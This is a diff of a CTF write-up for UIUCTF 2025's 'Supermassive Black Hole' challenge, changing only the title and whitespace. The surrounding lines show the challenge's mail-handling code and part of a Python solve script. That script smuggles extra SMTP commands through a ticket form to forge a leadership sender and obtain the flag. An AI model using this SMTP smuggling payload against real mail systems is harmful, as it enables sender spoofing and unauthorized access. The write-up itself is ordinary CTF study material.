@@ -1,5 +1,5 @@
 ---
-title: UIUCTF 2025 - Supermassive Black Hole
+title: UIUCTF 25 - Supermassive Black Hole
 date: 2025-07-30
 lastmod: 2025-07-30T13:00:30+02:00
 categories:
@@ -32,17 +32,17 @@ There's an SMTP server running internally on port 1025, unfortunately, the port 
 ```python
 async def start_server():
     init_database()
-    
+
     it_handler = ITBotHandler()
     controller = Controller(it_handler, hostname='localhost', port=1025)
-    
+
     controller.start()
-    
+
     return controller
 
 async def main():
     controller = await start_server()
-    
+
     try:
         while True:
             await asyncio.sleep(5)
@@ -96,7 +96,7 @@ from_header = message.get('From', 'Unknown')
 subject = message.get('Subject', 'No Subject')
 body = str(message.get_payload())
 ticket_id = message.get('X-Ticket-ID', f'{int(time.time())}_{self.processed_count}')
-            
+
 if internal.leadership_email in from_header.lower():
     response = "C-Suite ticket received! Will escalate immediately!" + f"\n{internal.flag}"
 elif internal.support_email in from_header.lower():
@@ -160,18 +160,18 @@ import requests, time, textwrap
 BASE = "https://inst-4e64969ec136b504-supermassive-black-hole.chal.uiuc.tf/"
 
 payload = (
-    "\n.\r\n"                                   
+    "\n.\r\n"
     "MAIL FROM:<ceo@supermassive.inc>\r\n"
     "RCPT TO:<it@blackholeticketing.com>\r\n"
     "DATA\r\n"
     "From: leadership@blackholeticketing.com\r\n"
     "To: it@blackholeticketing.com\r\n"
     "Subject: escalate\r\n"
-    "X-Ticket-ID: 1444\r\n"                      
+    "X-Ticket-ID: 1444\r\n"
     "\r\n"
     "pls fix asap\r\n"
-    ".\n"                                        
-)     
+    ".\n"
+)
 
 #injection ticket
 requests.post(f"{BASE}/submit_ticket",
